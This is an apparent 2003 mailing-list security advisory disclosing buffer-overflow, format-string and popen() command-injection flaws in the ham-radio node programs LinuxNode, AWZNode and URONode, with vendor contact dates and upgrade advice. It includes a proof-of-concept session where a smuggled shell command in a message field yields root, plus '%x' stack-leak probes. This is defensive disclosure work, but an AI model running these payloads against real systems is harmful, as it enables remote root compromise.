From: <Morgan.Wemanis@mark.se>
Subject: Security vulnerabilitys in AX.25/IP Node Software (multiple)
Date: Wed, 27 Aug 2003 19:21:05 +0200
Sender: linux-hams-owner@vger.kernel.org
Message-ID: <15F2A301AB74C44A995781A937567A7C010A6DCD@markadmex01.adm.mark.se>
Mime-Version: 1.0
Content-Transfer-Encoding: 7BIT
Return-path: <linux-hams-owner@vger.kernel.org>
Content-Class: urn:content-classes:message
List-Id: <linux-hams.vger.kernel.org>
Content-Type: text/plain; charset="us-ascii"
To: linux-hams@vger.kernel.org


----{ Security vulnerabilitys in AX.25/IP Node Software (multiple) }----

 * LinuxNode (up to v0.3.1)
 * AWZNode   (up to v0.4-pre2)
 * URONode   (up to v0.5-R2)
 * And other node clones based on LinuxNode. (or above clones)

Impact: REMOTE root
Severity: Critical

----{ Contacts }----

LinuxNode:
2003-08-23
 ==> Sent mail to oh2bns {at} sral.fi, Response same day <==
2003-08-24
 ==> ALL BUGS FIXED: Upgrade to LinuxNode v0.3.2 <==
 ==> http://hes.iki.fi/pub/ham/unix/linux/ax25/  <==
     Thanks Tomi for fast response and fixing! :-)

AWZNode:
2003-08-23
 ==> Sent mail to iz5awz {at} radio-gw.cnuce.cnr.it, NO Response yet <==

URONode:
2003-08-24
 ==> Sent mail to n1uro {at} n1uro.com, NO Response yet <==


----{ Recommendation }----

Sinse AWZNode and URONode is based on LinuxNode code,
you can replace these clones to LinuxNode without rewriting
any configuration files.

My recommendation:
You should replace any node clones to LinuxNode ASAP.
(At least until any node clone have fixed their security flaws)


----{ buffer overflow and popen() flaws }----

* URONode (up to v0.5-R2) [Message command]
  - mailbox.c:131 - Buffer overflow
  - popen() stuff below is availible for all! (REALY SERIUS!)

* AWZNode   (up to v0.4-pre2) [Send command]
  - mailbox.c:134 - Buffer overflow (Note 1)
  - popen() stuff below exist, but is not availible...  (Note 1)

* LinuxNode
  - This function does not exist in LinuxNode.

Note 1:
Need to have a callsign in /proc/net/ax25_calls, axcalluserid()
function check for this, but i dont get whole picture here.
(Was this in the old AX.25 kernel perhaps, long time ago?)


=[ NEVER use popen() or system() , always use exec() family !!! ]=

$ telnet sm6tky.ampr.org
Trying 44.140.208.129...
Connected to sk6ba.ampr.org.
Escape character is '^]'.

(sm6tky.ampr.org:node) login: sm6tky

#IP:sm6tky-13 using URONode v0.5-R2
Welcome, new user! Please use the Info command.


#IP:sm6tky-13 Welcome.
=>message ">/dev/null|``pwd;whoami;id``"
#IP:sm6tky-13 Enter the subject for the message.
This stuff is realy serius!

#IP:sm6tky-13 Enter your message. End with '/EX' on a line of its own.
If you have URONode, stop reading this and upgrade or replace your node software NOW!
/ex
/
root
uid=0(root) gid=0(root) groups=0(root)
#IP:sm6tky-13 Message sent to >/dev/null|``pwd;whoami;id``.
=>b
#IP:sm6tky-13 Goodbye.
Connection closed by foreign host.
$ 


----{ formatstring vulnerability in "talk" command }----

 * LinuxNode: Yes
 * AWZNode  : Yes
 * URONode  : Yes

-[ AWZNode ]-
AWZNode ->
talk sm6tky AAAAAAAAAA.%x.%x.%x.%x.%x.%x.%x.%x

Message from sm6tky:
AAAAAAAAAA.1.7373654d.20656761.6d6f7266.366d7320.3a796b74.4141410a.41414141 

Message sent to sm6tky

AWZNode ->

-[ URONode ]-

#IP:sm6tky-13 Welcome.
=>talk sm6tky AAAAAAAAAA.%x.%x.%x.%x.%x.%x.%x.%x

Message from sm6tky:
AAAAAAAAAA.1.7373654d.20656761.6d6f7266.366d7320.3a796b74.4141410a.41414141 

#IP:sm6tky-13 Message sent to sm6tky

=>

-[ LinuxNode ]-

#IP:sm6tky-13 Welcome to sm6tky.ampr.org network node

talk sm6tky AAAAAAAAA.%%x.%%x.%%x.%%x.%%x.%%x.%%x.%%x
#IP:sm6tky-13 Message from sm6tky:
AAAAAAAAA.1.7373654d.20656761.6d6f7266.366d7320.3a796b74.4141410a.41414141 
--

----{ bug in cmdparse() that can trigger buffer overflow }----

 * LinuxNode: Yes
 * AWZNode  : No
 * URONode  : No

#IP:sm6tky-13 Welcome to sm6tky.ampr.org network node

talk sm6tky %%x.%%x.%%x.%%x.%%x.%%x.%%x.%%x.%%x.%%x.%%x.%%x.%%x.%%x.%%x.%%x
[970 bytes]
[4 bytes to overwrite EIP]


----{ buffer overflow in command.c: do_help() }----

 * LinuxNode: Yes
 * AWZNode  : Yes
 * URONode  : Yes

    strcat(fname, argv[1]);

----{ formatstring vulnerability in util.c: log() }----

 * LinuxNode: Yes
 * AWZNode  : Yes
 * URONode  : Yes

    syslog(pri, buf);

----{ buffer overflow in gateway.c: do_connect() }----

 * LinuxNode: No
 * AWZNode  : Yes
 * URONode  : Yes

    strcpy(call, strupr(argv[1]));

----{ Exploit(s) / PoC }---

I'm not releasing any exploit for only one reason.
- That whould not do any good to the Ham community.

I have tested to exploit some of the above flaws with success.

Some of them are quite tricky to exploit,
and some is _very_easy_ to exploit.

(Any request for exploits will be redirected to /dev/null)


>>>>>>>> UPGRADE/REPLACE YOUR NODE TODAY !! <<<<<<<<


73 de Morgan, sm6tky {at} qsl.net

----{ EOF }----

